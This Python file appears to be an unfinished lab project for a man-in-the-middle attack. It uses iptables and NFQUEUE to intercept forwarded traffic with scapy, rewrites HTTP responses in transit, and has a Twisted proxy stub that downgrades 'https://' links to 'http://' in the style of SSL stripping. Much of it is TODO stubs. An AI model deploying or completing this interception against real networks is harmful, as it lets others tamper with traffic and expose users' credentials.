from scapy.all import *
from OpenSSL import SSL
import os
from netfilterqueue import NetfilterQueue
import re
from twisted.web import http


##############################################
#
# setting up a proxy server using Twisted 
#
##############################################

# Dictionary to track TCP and SSL connections 
tcp_connections = {}
ssl_contexts = {}

# TODO: 
# called when a request is received
# It reads the request content, modifies it (replacing 'https://' with 'http://'),
# and then writes the modified content back to the response.
class ProxyRequestHandler(http.Request):
    def process(self):
        self.content.seek(0, 0)
        headers = self.getAllHeaders().copy()
        requestContent = self.content.read()
        headers['Content-Length'] = len(requestContent)

        # Modify the request content here
        requestContent = re.sub('https://', 'http://', requestContent)

        self.setResponseCode(200, 'OK')
        self.responseHeaders = headers
        self.write(requestContent)
        self.finish()

# TODO: 
# called when a response is received
class Proxy(http.HTTPChannel):
    requestFactory = ProxyRequestHandler

# TODO: 
# called when a connection is made
class ProxyFactory(http.HTTPFactory):
    protocol = Proxy

# TODO: 
# starts the Twisted reactor, which is the event loop that drives the server. 
# Creates an instance of ProxyFactory and tells the reactor to listen for incoming TCP connections on port 10000.
def start_proxy():
    from twisted.internet import reactor
    factory = ProxyFactory()
    reactor.listenTCP(10000, factory)
    reactor.run()


# TODO: check if packet is a TLS packet
def is_tls_client_hello(packet):
    
    return True

# TODO: 
def process_packet(packet):
    return packet

# modified to call intercept_packet
def intercept_packet(packet):
    print("[+] Packet intercepted: ")

    print("--------------------------------------------------")
    # Convert packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    #print(scapy_packet.show())
    
    # Check if packet is a HTTP request
    if scapy_packet.haslayer(TCP):
        if scapy_packet[TCP].dport == 80:
            print("[+] HTTP Request...")
            if scapy_packet.haslayer(Raw):
                load = scapy_packet[Raw].load.decode()
                scapy_packet[Raw].load = load.encode()
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))
        elif scapy_packet[TCP].dport == 443:
            print("[+] HTTPS Request...")
            #process_packet(scapy_packet)
            # TODO: 

    # Check if the packet is a response
    if scapy_packet[TCP].sport == 80:
        print("[+] HTTP Response...")
        if scapy_packet.haslayer(Raw):
            load = scapy_packet[Raw].load.decode()

            # Modify the response as necessary
            load = re.sub('<html><body><h1>It works!</h1></body></html>', \
                            '<html><body><h1>Now you are seeing a modified packet</h1></body></html>', load)
                
            scapy_packet[Raw].load = load.encode()
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            packet.set_payload(bytes(scapy_packet))

    # Accept packet
    packet.accept()

    
def start():
    # Enable IP forwarding
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")

    # Set up iptables rule
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

    # Set up packet queue
    queue = NetfilterQueue()
    queue.bind(0, intercept_packet)

    try:
        print("[+] Starting packet interception...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[-] Stopping packet interception...")
        queue.unbind()

    # Start the proxy
    start_proxy()


if __name__ == "__main__":
    start()